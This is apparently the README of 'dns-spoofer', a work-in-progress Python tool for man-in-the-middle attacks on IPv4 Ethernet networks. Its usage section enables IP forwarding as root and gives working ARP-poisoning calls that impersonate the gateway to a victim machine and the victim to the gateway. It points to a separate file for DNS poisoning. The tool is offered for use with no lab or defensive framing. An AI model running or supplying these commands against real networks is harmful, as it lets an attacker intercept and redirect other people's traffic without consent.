[![Build Status](https://travis-ci.org/adw1n/dns-spoofer.svg?branch=master)](https://travis-ci.org/adw1n/dns-spoofer)
![implementation](https://img.shields.io/badge/python-3.4%2C%203.5%2C%203.6-blue.svg)
![versions](https://img.shields.io/badge/implementation-cpython-blue.svg)

Work In Progress
### About
man in the middle attacks

#### Limitations
* Ethernet II networks
* ipv4 only


### Dependencies
* libnet-dev
* libpcap-dev

### Install
I recommend using a virtualenv for this.
```bash
git clone https://github.com/adw1n/dns-spoofer
cd dns-spoofer
python setup.py build
python setup.py install  # or add dnsspoofer.so to the PYTHONPATH
```

### Usage
```bash
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo python  # dnsspoofer requires root privileges
```
#### ARP poisoning
```python
import dnsspoofer

# module documentation is available by:
# help(dnsspoofer)

# your mac addr:
# 33:33:33:33:33:33
# example arp -n output:
# gateway:
# 192.168.1.1     ether   10:20:30:40:50:60   C  em1
# victim:
# 192.168.1.100   ether   01:02:03:04:05:06   C  em1
dnsspoofer.spoof_arp(b"\x01\x02\x03\x04\x05\x06",b"192.168.1.1")
# now arp -n output on the victim machine:
# 192.168.1.1     ether   33:33:33:33:33:33   C  em1

# you probably also want to spoof the victim's (192.168.1.100)
# mac address on the gateway
dnsspoofer.spoof_arp(b"\x10\x20\x30\x40\x50\x60",b"192.168.1.100")
```

#### DNS poisoning
see the [example.py](example.py) file
